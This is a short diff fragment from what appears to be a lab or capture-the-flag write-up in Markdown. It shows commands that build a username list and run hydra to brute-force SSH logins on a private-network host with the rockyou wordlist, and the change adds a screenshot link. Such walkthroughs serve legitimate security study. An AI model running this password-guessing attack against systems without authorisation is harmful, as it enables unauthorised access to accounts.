@@ -171,3 +171,4 @@ echo "john william james Evelyn Mason harper gandalf" | tr " " "\n" > users.txt
 hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.121 -f -V
 ```
 
+![image](https://user-images.githubusercontent.com/5285547/130261096-40245c8f-13a2-45f2-8f0e-33c72e964c26.png)
